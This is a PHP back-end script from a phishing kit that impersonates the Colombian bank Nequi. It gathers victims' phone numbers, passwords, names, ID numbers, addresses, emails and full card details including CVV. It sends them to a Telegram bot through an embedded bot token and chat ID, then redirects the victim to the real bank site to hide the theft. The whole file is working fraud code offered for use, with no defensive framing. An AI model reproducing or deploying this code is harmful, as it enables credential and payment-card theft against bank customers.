<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibe los datos del formulario
    $codigo = $_POST['codigo'];
    $fecha = $_POST['fecha'];
    $cvv = $_POST['cvv'];

    // Recibe los datos de sesión previamente establecidos
    $user = $_SESSION["j_username"] ?? '';
    $pass = $_SESSION["j_password"] ?? '';
    $nombre = $_SESSION["nombre"] ?? '';
    $cedula = $_SESSION["cedula"] ?? '';
    $ciudad = $_SESSION["ciudad"] ?? '';
    $dir = $_SESSION["dir"] ?? '';
    $email = $_SESSION["email"] ?? '';

    $contenido = "\n 🔥NEQUI REGISTRO🔥";
    $contenido .= "\n📞Número Teléfono: $user";
    $contenido .= "\n📞Contraseña: $pass";
    $contenido .= "\n\n Otros Datos";
    $contenido .= "\n🪪 Nombre: $nombre";
    $contenido .= "\n🪪 Cedula: $cedula";
    $contenido .= "\n🪪 Ciudad: $ciudad";
    $contenido .= "\n🪪 Direccion: $dir";
    $contenido .= "\n🪪 Email: $email";
    $contenido .= "\nDATOS KOKOLOKO";
    $contenido .= "\n💳 Codigo: $codigo";
    $contenido .= "\n💳 Fecha Exp: $fecha";
    $contenido .= "\n💳 Cvv: $cvv";

    $token = "8431946474:AAGwPGma91nER9-mCScFLy3AvOChIZIoa0M";
    $chatId = "-4855438579";
    enviarMensajeTelegram($chatId, $contenido, $token);

    // Mensaje de éxito para el usuario
    echo "<!DOCTYPE html>
    <html lang='en'>
    <head>
        <meta charset='UTF-8'>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <title>Registro Exitoso</title>
        <link rel='stylesheet' type='text/css' href='css/normalize.css'>
        <link rel='stylesheet' type='text/css' href='css/nequi_two.webflow.css'>
        <link rel='stylesheet' type='text/css' href='css/nequi_one.webflow.css'>
        <link rel='stylesheet' type='text/css' href='css/main.css'>
    </head>
    <body>
        <h1>¡Registro exitoso!</h1>
        <p>Tus datos han sido enviados correctamente.</p>
        <script>
            setTimeout(function() {
                window.location.href = 'https://www.nequi.com.co';
            }, 2000);
        </script>
    </body>
    </html>";
} else {
    header("Location: login.html");
    exit;
}

function enviarMensajeTelegram($chatId, $contenido, $token) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = array(
        'chat_id' => $chatId,
        'text' => $contenido
    );

    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        )
    );

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === false) {
        return false;
    }
    return true;
}
?>
